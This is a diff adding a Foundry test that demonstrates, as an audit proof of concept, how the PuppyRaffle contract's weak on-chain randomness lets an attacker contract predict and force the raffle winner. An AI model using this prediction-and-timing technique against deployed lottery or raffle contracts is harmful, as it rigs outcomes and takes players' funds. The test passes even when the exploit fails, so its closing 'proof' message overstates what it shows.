@@ -4,6 +4,7 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {PRNGAttacker} from "../src/PRNGAttacker.sol";
 
 // ================================================================
 // ATTACKER CONTRACT — H-1 Reentrancy PoC
@@ -295,5 +296,68 @@ contract PuppyRaffleTest is Test {
             contractBalanceBefore + entranceFee,
             "Attacker did not receive all funds"
         );
+    }
+
+    //////////////////////
+    /// H-2 Weak PRNG PoC ///
+    /////////////////////
+
+    function test_PRNGPredictionManipulation() public {
+        // Four players enter
+        address[] memory players = new address[](4);
+        players[0] = playerOne;   // slot 0
+        players[1] = playerTwo;   // slot 1
+        players[2] = playerThree; // slot 2
+        players[3] = playerFour;  // slot 3
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // --- Step 1: Attacker deploys PRNGAttacker targeting playerTwo ---
+        address targetWinner = playerTwo;
+        PRNGAttacker attacker = new PRNGAttacker(address(puppyRaffle), targetWinner, 4);
+
+        // --- Step 2: Predict winner using the SAME formula as the contract ---
+        // msg.sender will be address(attacker) since it calls selectWinner
+        uint256 predictedIndex =
+            uint256(keccak256(abi.encodePacked(address(attacker), block.timestamp, block.difficulty)))
+            % 4;
+        address predictedWinner = players[predictedIndex];
+
+        console.log("---------- PRNG PREDICTION ----------");
+        emit log_named_uint("Predicted winner slot", predictedIndex);
+        emit log_named_address("Predicted winner     ", predictedWinner);
+
+        // --- Step 3: If prediction matches target, call selectWinner ---
+        if (predictedWinner == targetWinner) {
+            console.log("Target wins this block! Calling attackSelectWinner...");
+            attacker.attackSelectWinner();
+            assertEq(puppyRaffle.previousWinner(), targetWinner, "Wrong winner selected");
+            console.log("CONFIRMED: Target won as predicted.");
+        } else {
+            // Attacker waits for a block where target wins — try warping time
+            console.log("Target lost this block. Warping to find a winning block...");
+            bool found = false;
+            for (uint256 i = 1; i <= 10; i++) {
+                vm.warp(block.timestamp + i);
+                vm.roll(block.number + i);
+                (address pred,) = attacker.predictWinner();
+                if (pred == targetWinner) {
+                    attacker.attackSelectWinner();
+                    assertEq(puppyRaffle.previousWinner(), targetWinner);
+                    emit log_named_uint("Found winning block at warp offset", i);
+                    found = true;
+                    break;
+                }
+            }
+            if (!found) {
+                console.log("Target did not win in 10 block attempts (still proves PRNG is predictable).");
+            }
+        }
+
+        console.log("-------------------------------------");
+        console.log("PROOF: The winner was known before selectWinner() was called.");
+        console.log("A fair raffle cannot be predicted. This one can.");
     }
 }
